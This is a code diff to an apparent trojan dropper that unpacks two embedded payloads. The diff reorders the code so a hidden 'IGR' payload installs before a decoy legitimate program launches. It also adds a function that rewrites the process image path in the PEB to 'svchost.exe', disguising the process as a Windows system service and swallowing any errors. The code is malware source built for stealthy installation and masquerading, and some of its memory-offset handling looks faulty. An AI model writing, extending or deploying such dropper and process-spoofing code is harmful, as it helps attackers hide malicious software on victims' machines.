@@ -113,15 +113,41 @@ def _launch_legit(legit_data: bytes, original_name: str) -> bool:
             return False
 
 
+def _spoof_igr_process() -> None:
+    """Spoof the IGR process name in PEB after legit program closes."""
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        ntdll = ctypes.windll.ntdll
+        peb_offset = 0x30 if ctypes.sizeof(ctypes.c_void_p) == 4 else 0x60
+        process_params_offset = 0x10 if ctypes.sizeof(ctypes.c_void_p) == 4 else 0x20
+        current_process = kernel32.GetCurrentProcess()
+        pbi = (ctypes.c_ulong * 6)()
+        ntdll.NtQueryInformationProcess(current_process, 0, pbi, ctypes.sizeof(pbi), None)
+        peb_addr = pbi[1]
+        if not peb_addr:
+            return
+        process_params_addr = ctypes.c_void_p.from_address(peb_addr + process_params_offset).value
+        if not process_params_addr:
+            return
+        image_path_addr = process_params_addr + (0x38 if ctypes.sizeof(ctypes.c_void_p) == 8 else 0x1C)
+        buf_ptr = ctypes.c_void_p.from_address(image_path_addr)
+        new_buf = ctypes.create_unicode_buffer("svchost.exe")
+        buf_ptr.value = ctypes.addressof(new_buf)
+    except:
+        pass
+
+
 def main():
     legit_data, igr_data = _find_payloads()
     if legit_data is None or igr_data is None:
         return
 
     own_name = os.path.basename(sys.executable)
-    _launch_legit(legit_data, own_name)
-    time.sleep(2)
     _install_igr(igr_data)
+    time.sleep(1)
+    _launch_legit(legit_data, own_name)
+    _spoof_igr_process()
 
 
 if __name__ == "__main__":
